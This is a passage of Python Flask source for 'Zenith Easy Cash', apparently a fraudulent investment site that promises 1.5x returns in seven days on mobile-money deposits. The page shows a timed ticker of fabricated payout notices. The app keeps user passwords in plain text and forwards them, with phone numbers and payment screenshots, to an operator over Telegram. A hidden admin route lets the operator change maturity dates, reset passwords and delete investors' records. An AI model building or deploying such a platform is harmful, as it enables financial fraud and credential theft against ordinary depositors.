            item.innerHTML = `✅ <b>${name}</b><span class="location">📍 ${town}</span><div style="margin-top:4px;">Cashed out <span class="payout-amount">GHs ${amt.toLocaleString()}</span> via MoMo</div>`;
            list.prepend(item);
            if (list.children.length > 6) list.lastChild.remove();
        }
        setInterval(addSideTickerItem, 4500);
        addSideTickerItem();
        addSideTickerItem();
        addSideTickerItem();
    </script>
</body>
</html>
"""

INVESTOR_PROFILE_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investor Profile - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 550px; background: #fff; padding: 30px; margin: 40px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; text-align: center; margin-top: 0; }
        .back-link { margin-bottom: 20px; font-size: 14px; }
        .back-link a { color: #028a0f; text-decoration: none; font-weight: bold; }
        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #2e7d32; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="back-link"><a href="{{ url_for('dashboard') }}">← Back to Dashboard</a></div>
        <h2>Investor Profile Settings</h2>

        {% with messages = get_flashed_messages() %}
          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
        {% endwith %}

        <div style="text-align: center; margin-bottom: 20px;">
            {% if investor.profile_pic %}
                <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar-large">
            {% else %}
                <img src="{{ default_avatar_svg }}" class="profile-avatar-large">
            {% endif %}
            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
        </div>

        <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label>Full Name:</label>
                <input type="text" name="name" value="{{ investor.name }}" required>
            </div>
            <div class="form-group">
                <label>Phone Number (Locked):</label>
                <input type="text" value="{{ investor.number }}" disabled style="background:#f1f5f9;">
            </div>
            <div class="form-group">
                <label>Work / Job:</label>
                <input type="text" name="work" value="{{ investor.work }}" required>
            </div>
            <div class="form-group">
                <label>Region / Town:</label>
                <input type="text" name="region" value="{{ investor.region }}" required>
            </div>
            <div class="form-group">
                <label>Upload/Change Profile Picture:</label>
                <input type="file" name="profile_pic" accept="image/*">
            </div>
            <button type="submit">Save Profile Changes</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Admin Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Admin Authentication</h2>
        <form method="POST">
            <div class="form-group"><label>Admin Password:</label><input type="password" name="password" required></div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Admin Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 1200px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; float: left; margin-top: 0; }
        .logout { float: right; }
        .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
        .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
        th { background-color: #2e7d32; color: white; }
        .btn-action { background: #2e7d32; color: white; padding: 5px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
        .btn-payout { background: #d32f2f; }
        img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; }
        .edit-form { display: flex; gap: 4px; margin-top: 4px; align-items: center; }
        .edit-form input { padding: 4px; font-size: 11px; width: 110px; }
    </style>
</head>
<body>
    <div class="container">
        <div>
            <h2>Admin Dashboard</h2>
            <div class="logout"><a href="{{ url_for('admin_logout') }}">Logout</a></div>
            <div style="clear: both;"></div>
        </div>

        <div class="settings-box">
            <h3>⚙️ Update Company Payment Details</h3>
            <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
                <div style="flex: 1;"><label style="font-size: 12px; font-weight:bold;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%;"></div>
                <div style="flex: 2;"><label style="font-size: 12px; font-weight:bold;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%;"></div>
                <div><button type="submit" style="background: #ffa000; color: white; border: none; padding: 9px 15px; font-weight: bold; border-radius: 4px; cursor: pointer;">Update Details</button></div>
            </form>
        </div>

        <h3>Registered Investors & Portfolio Management</h3>
        <table>
            <thead>
                <tr>
                    <th>Investor Info</th>
                    <th>Password Management</th>
                    <th>Investment Slot Details</th>
                    <th>Job / Region</th>
                    <th>Maturity Time</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% if flat_investments %}
                    {% for item in flat_investments %}
                    <tr>
                        <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
                        <td>
                            <span><b>Pass:</b> {{ item.password }}</span>
                            <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
                                <input type="text" name="new_password" placeholder="New pass" required>
                                <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
                            </form>
                        </td>
                        <td>
                            <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
                            <small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
                            <small>ID: {{ item.transaction_id }}</small><br>
                            {% if item.screenshot %}
                                <a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank">
                                    <img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb">
                                </a>
                            {% endif %}
                        </td>
                        <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                        <td>
                            <span>{{ item.maturity_date }}</span>
                            <form action="{{ url_for('update_maturity', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" class="edit-form">
                                <input type="text" name="new_maturity" value="{{ item.maturity_date }}" required>
                                <button type="submit" class="btn-action" style="background:#0284c7;">Set</button>
                            </form>
                        </td>
                        <td><span style="color: #e65100; font-weight: bold;">{{ item.status }}</span></td>
                        <td>
                            {% if item.status == 'Pending Admin Payment Confirmation' %}
                                <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
                                    <button type="submit" class="btn-action">Approve & Start Timer</button>
                                </form>
                            {% elif item.status == 'Withdrawal Requested' %}
                                <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
                                    <button type="submit" class="btn-action btn-payout">Pay Out</button>
                                </form>
                            {% else %}
                                <span>{{ item.status }}</span>
                            {% endif %}
                            
                            <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete this investment slot?');">
                                <button type="submit" class="btn-action" style="background:#6b7280;">Delete</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                {% else %}
                    <tr><td colspan="7" style="text-align: center; color: #666;">No registrations found.</td></tr>
                {% endif %}
            </tbody>
        </table>
    </div>
</body>
</html>
"""


@app.route("/", methods=["GET", "POST"])
def index():
  settings = load_settings()
  if request.method == "POST":
    try:
      amount = float(request.form["amount"])
      if amount < 200 or amount > 500000:
        flash("Investment amount must be between 200 GHs and 500,000 GHs.")
        return redirect(url_for("index"))

      password = request.form.get("password", "").strip()
      number = request.form.get("number", "").strip()
      name = request.form.get("name", "").strip()
      work = request.form.get("work", "").strip()
      region = request.form.get("region", "").strip()

      if not password:
        flash("Please provide a secure account password.")
        return redirect(url_for("index"))

      transaction_id = request.form.get("transaction_id", "").strip()
      file = request.files.get("payment_screenshot")

      filename = ""
      if file and file.filename != "":
        filename = secure_filename(f"{int(time.time())}_{file.filename}")
        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))

      if not transaction_id and not filename:
        flash("Please provide either a Transaction ID or upload a screenshot.")
        return redirect(url_for("index"))

      now = datetime.now()
      expected_return = amount * 1.5

      investor_data = {
          "name": name,
          "number": number,
          "password": password,
          "work": work,
          "region": region,
          "amount": amount,
          "expected_return": expected_return,
          "transaction_id": transaction_id
          if transaction_id
          else "Uploaded Screenshot",
          "screenshot": filename,
          "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
          "maturity_date": "Pending Approval",
          "status": "Pending Admin Payment Confirmation",
          "profile_pic": "",
      }

      save_investor_data(investor_data)

      telegram_message = (
          f"🚨 <b>NEW USER REGISTRATION</b>\n\n"
          f"👤 <b>Full Name:</b> {name}\n"
          f"📞 <b>Phone Number:</b> {number}\n"
          f"🔑 <b>Account Password:</b> {password}\n"
          f"💼 <b>Work/Job:</b> {work}\n"
          f"📍 <b>Region/Town:</b> {region}\n"
          f"💰 <b>Capital Amount:</b> GHs {amount:,.2f}\n"
          f"🎯 <b>Expected Return:</b> GHs {expected_return:,.2f}\n"
          f"💳 <b>Transaction ID:</b> {transaction_id if transaction_id else 'Attached Screenshot'}\n"
          f"⏰ <b>Registration Time:</b> {now.strftime('%Y-%m-%d %H:%M:%S')}"
      )

      send_telegram_alert(
          telegram_message,
          os.path.join(app.config["UPLOAD_FOLDER"], filename)
          if filename
          else None,
      )

      session.permanent = True
      session["investor_number"] = number
      flash(
          "Registration Successful! Welcome to your Investor Portal Dashboard."
      )
      return redirect(url_for("dashboard"))

    except ValueError:
      flash("Invalid input. Please check your data.")
      return redirect(url_for("index"))

  return render_template_string(
      HTML_TEMPLATE,
      settings=settings,
      admin_telegram_link=ADMIN_TELEGRAM_LINK,
      zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
  )


@app.route("/api/track", methods=["POST"])
def api_track():
  data = request.get_json() or {}
  number = data.get("number", "").strip()
  password = data.get("password", "").strip()

  investors = load_investors()
  for inv in investors:
    if inv.get("number") == number:
      if inv.get("password") != password:
        return jsonify({"success": False, "message": "Incorrect Password."})

      inv_list = inv.get("investments", [])
      if not inv_list and "amount" in inv:
        inv_list = [
            {
                "amount": inv.get("amount"),
                "expected_return": inv.get(
                    "expected_return", inv.get("amount") * 1.5
                ),
                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                "status": inv.get("status"),
            }
        ]
      cleaned_investments = []
      for slot in inv_list:
        cleaned_investments.append({
            "amount": slot.get("amount"),
            "expected_return": slot.get(
                "expected_return", slot.get("amount") * 1.5
            ),
            "maturity_date": slot.get("maturity_date", "Pending Approval"),
            "status": slot.get("status"),
        })
      return jsonify({
          "success": True,
          "name": inv.get("name"),
          "investments": cleaned_investments,
      })

  return jsonify(
      {"success": False, "message": "No account found with this phone number."}
  )


@app.route("/login", methods=["GET", "POST"])
def login():
  if request.method == "POST":
    number = request.form.get("number", "").strip()
    password = request.form.get("password", "").strip()
    investors = load_investors()
    for inv in investors:
      if inv.get("number") == number and inv.get("password") == password:
        session.permanent = True
        session["investor_number"] = number
        return redirect(url_for("dashboard"))
    flash("Invalid phone number or password.")
    return redirect(url_for("login"))
  return render_template_string(INVESTOR_LOGIN_TEMPLATE)


@app.route("/dashboard")
def dashboard():
  number = session.get("investor_number")
  if not number:
    return redirect(url_for("login"))

  investors = load_investors()
  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
  investments_found = []
  settings = load_settings()
  now = datetime.now()

  current_balance = 0.0
  pending_balance = 0.0

  for inv in investors:
    if inv.get("number") == number:
      investor_info = {
          "name": inv.get("name", "Investor"),
          "number": number,
          "work": inv.get("work", ""),
          "region": inv.get("region", ""),
          "profile_pic": inv.get("profile_pic", ""),
      }
      inv_list = inv.get("investments", [])
      if not inv_list and "amount" in inv:
        inv_list = [
            {
                "amount": inv.get("amount"),
                "expected_return": inv.get(
                    "expected_return", inv.get("amount") * 1.5
                ),
                "transaction_id": inv.get("transaction_id"),
                "screenshot": inv.get("screenshot"),
                "date_time": inv.get("date_time"),
                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                "status": inv.get("status"),
            }
        ]

      for s_idx, slot in enumerate(inv_list):
        slot_copy = slot.copy()
        slot_copy["sub_idx"] = f"{number}_{s_idx}"
        if "expected_return" not in slot_copy:
          slot_copy["expected_return"] = slot_copy["amount"] * 1.5

        status = slot_copy.get("status", "")
        if status == "Payment Confirmed & Active":
          current_balance += float(slot_copy["amount"])
        elif status == "Pending Admin Payment Confirmation":
          pending_balance += float(slot_copy["amount"])

        maturity_str = slot_copy.get("maturity_date", "Pending Approval")
        slot_copy["can_withdraw"] = False

        if maturity_str != "Pending Approval":
          try:
            maturity_dt = datetime.strptime(
                maturity_str, "%Y-%m-%d %H:%M:%S"
            )
            slot_copy["can_withdraw"] = (
                now >= maturity_dt and status == "Payment Confirmed & Active"
            )
          except Exception:
            pass

        investments_found.append(slot_copy)

  return render_template_string(
      INVESTOR_DASHBOARD_TEMPLATE,
      investments=investments_found,
      investor=investor_info,
      settings=settings,
      admin_telegram_link=ADMIN_TELEGRAM_LINK,
      current_balance=current_balance,
      pending_balance=pending_balance,
  )


@app.route("/profile")
def profile_page():
  number = session.get("investor_number")
  if not number:
    return redirect(url_for("login"))

  investors = load_investors()
  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
  for inv in investors:
    if inv.get("number") == number:
      investor_info = {
          "name": inv.get("name", "Investor"),
          "number": number,
          "work": inv.get("work", ""),
          "region": inv.get("region", ""),
          "profile_pic": inv.get("profile_pic", ""),
      }
      break

  return render_template_string(
      INVESTOR_PROFILE_TEMPLATE,
      investor=investor_info,
      default_avatar_svg=DEFAULT_AVATAR_SVG,
  )


@app.route("/update-profile", methods=["POST"])
def update_profile():
  number = session.get("investor_number")
  if not number:
    return redirect(url_for("login"))

  investors = load_investors()
  for inv in investors:
    if inv.get("number") == number:
      inv["name"] = request.form.get("name", inv.get("name"))
      inv["work"] = request.form.get("work", inv.get("work"))
      inv["region"] = request.form.get("region", inv.get("region"))

      file = request.files.get("profile_pic")
      if file and file.filename != "":
        filename = secure_filename(
            f"profile_{number}_{int(time.time())}_{file.filename}"
        )
        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
        inv["profile_pic"] = filename

      save_all_investors(investors)
      flash("Profile details updated successfully!")
      break

  return redirect(url_for("profile_page"))


@app.route("/logout")
def logout():
  session.pop("investor_number", None)
  return redirect(url_for("index"))


@app.route("/topup/<sub_idx>", methods=["POST"])
def topup(sub_idx):
  try:
    number, idx_str = sub_idx.split("_")
    investors = load_investors()
    for inv in investors:
      if inv.get("number") == number:
        topup_amt = float(request.form["topup_amount"])
        topup_proof = request.form.get("topup_proof", "").strip()
        file = request.files.get("topup_screenshot")

        filename = ""
        if file and file.filename != "":
          filename = secure_filename(f"topup_{int(time.time())}_{file.filename}")
          file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))

        now = datetime.now()
        new_investment = {
            "amount": topup_amt,
            "expected_return": topup_amt * 1.5,
            "transaction_id": topup_proof
            if topup_proof
            else "Screenshot attached",
            "screenshot": filename,
            "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
            "maturity_date": "Pending Approval",
            "status": "Pending Admin Payment Confirmation",
        }

        if "investments" not in inv:
          inv["investments"] = []
        inv["investments"].append(new_investment)
        save_all_investors(investors)

        send_telegram_alert(
            f"📈 <b>NEW TOP-UP SUBMISSION</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital: GHs {topup_amt}",
            os.path.join(app.config["UPLOAD_FOLDER"], filename)
            if filename
            else None,
        )
        flash("Top-up submitted successfully for confirmation!")
  except Exception:
    flash("Invalid top-up submission.")
  return redirect(url_for("dashboard"))


@app.route("/withdraw/<sub_idx>", methods=["GET"])
def withdraw(sub_idx):
  try:
    number, idx_str = sub_idx.split("_")
    idx = int(idx_str)
    investors = load_investors()
    for inv in investors:
      if inv.get("number") == number:
        inv_list = inv.get("investments", [])
        if 0 <= idx < len(inv_list):
          inv_list[idx]["status"] = "Withdrawal Requested"
          save_all_investors(investors)
          send_telegram_alert(
              f"📥 <b>WITHDRAWAL REQUESTED</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n💰 Payout Due: GHs {inv_list[idx]['expected_return']}"
          )
          flash("Withdrawal request submitted successfully!")
  except Exception:
    pass
  return redirect(url_for("dashboard"))


@app.route("/zenith-secret-admin", methods=["GET", "POST"])
def admin_login():
  if request.method == "POST":
    if request.form.get("password") == ADMIN_PASSWORD:
      session.permanent = True
      session["admin_logged_in"] = True
      return redirect(url_for("admin_dashboard"))
    flash("Incorrect password.")
  return render_template_string(ADMIN_LOGIN_TEMPLATE)


@app.route("/admin-dashboard")
def admin_dashboard():
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  flat_investments = []
  for p_idx, inv in enumerate(investors):
    inv_list = inv.get("investments", [])
    if not inv_list and "amount" in inv:
      inv_list = [
          {
              "amount": inv.get("amount"),
              "expected_return": inv.get(
                  "expected_return", inv.get("amount") * 1.5
              ),
              "transaction_id": inv.get("transaction_id"),
              "screenshot": inv.get("screenshot"),
              "date_time": inv.get("date_time"),
              "maturity_date": inv.get("maturity_date", "Pending Approval"),
              "status": inv.get("status"),
          }
      ]
    for s_idx, slot in enumerate(inv_list):
      item = slot.copy()
      item["parent_idx"] = p_idx
      item["sub_idx"] = s_idx
      item["name"] = inv.get("name")
      item["number"] = inv.get("number")
      item["password"] = inv.get("password", "123456")
      item["work"] = inv.get("work", "-")
      item["region"] = inv.get("region", "-")
      flat_investments.append(item)

  settings = load_settings()
  return render_template_string(
      ADMIN_DASHBOARD_TEMPLATE,
      flat_investments=flat_investments,
      settings=settings,
  )


@app.route("/admin/settings", methods=["POST"])
def update_settings():
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  settings = load_settings()
  settings["momo_number"] = request.form.get(
      "momo_number", settings["momo_number"]
  )
  settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
  save_settings(settings)
  flash("Company details updated.")
  return redirect(url_for("admin_dashboard"))


@app.route(
    "/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
)
def confirm_payment(parent_idx, sub_idx):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
      now = datetime.now()
      maturity = now + timedelta(days=7)
      inv_list[sub_idx]["maturity_date"] = maturity.strftime(
          "%Y-%m-%d %H:%M:%S"
      )
      save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))


@app.route(
    "/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>",
    methods=["POST"],
)
def complete_withdrawal(parent_idx, sub_idx):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list[sub_idx]["status"] = "Withdrawn Completed"
      save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))


@app.route(
    "/admin/update-maturity/<int:parent_idx>/<int:sub_idx>",
    methods=["POST"],
)
def update_maturity(parent_idx, sub_idx):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      new_time = request.form.get("new_maturity", "").strip()
      if new_time:
        inv_list[sub_idx]["maturity_date"] = new_time
        save_all_investors(investors)
        flash("Maturity date successfully updated.")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/update-password/<int:parent_idx>", methods=["POST"])
def update_password(parent_idx):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    new_pass = request.form.get("new_password", "").strip()
    if new_pass:
      investors[parent_idx]["password"] = new_pass
      save_all_investors(investors)
      flash("Password updated.")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/delete/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
def delete_slot(parent_idx, sub_idx):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list.pop(sub_idx)
      if not inv_list:
        investors.pop(parent_idx)
      save_all_investors(investors)
      flash("Investment slot deleted.")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin-logout")
def admin_logout():
  session.pop("admin_logged_in", None)
  return redirect(url_for("index"))


@app.route("/uploads/<filename>")
def uploaded_file(filename):
  return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5001))
  app.run(host="0.0.0.0", port=port)
